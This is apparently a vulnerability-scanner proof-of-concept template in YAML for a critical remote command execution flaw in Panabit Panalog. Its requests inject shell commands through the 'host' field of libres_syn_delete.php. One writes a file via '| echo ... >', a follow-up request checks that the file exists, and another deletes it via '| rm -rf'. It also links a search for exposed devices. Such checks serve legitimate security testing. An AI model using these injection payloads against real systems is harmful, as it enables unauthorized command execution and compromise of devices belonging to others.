name: poc-yaml-panabit-panalog-libressyndelete-rce
binding: 927245b3-a97c-4228-a21f-dbea7892015d
manual: true
detail:
    author: y0y0
    links:
        - https://www.seebug.org/vuldb/ssvid-99401
        - https://fofa.info/result?qbase64=YXBwPSJQYW5hYml0LVBhbmFsb2ci
    vulnerability:
        level: critical
transport: http
set:
    fileName: randomLowercase(4) + ".txt"
    content: randomLowercase(8)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /content-apply/libres_syn_delete.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: token=1&id=2&host=| echo {{content}} >{{fileName}}
            follow_redirects: false
        expression: response.status == 200 && response.body_string.startsWith('{"yn":"yes"')
    r1:
        request:
            cache: true
            method: GET
            path: /content-apply/{{fileName}}
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(content)
    r2:
        request:
            cache: true
            method: POST
            path: /content-apply/libres_syn_delete.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: token=1&id=2&host=| rm -rf {{fileName}}
            follow_redirects: false
        expression: response.status == 200 && response.body_string.startsWith('{"yn":"yes"')
expression: r0() && r1() && r2()
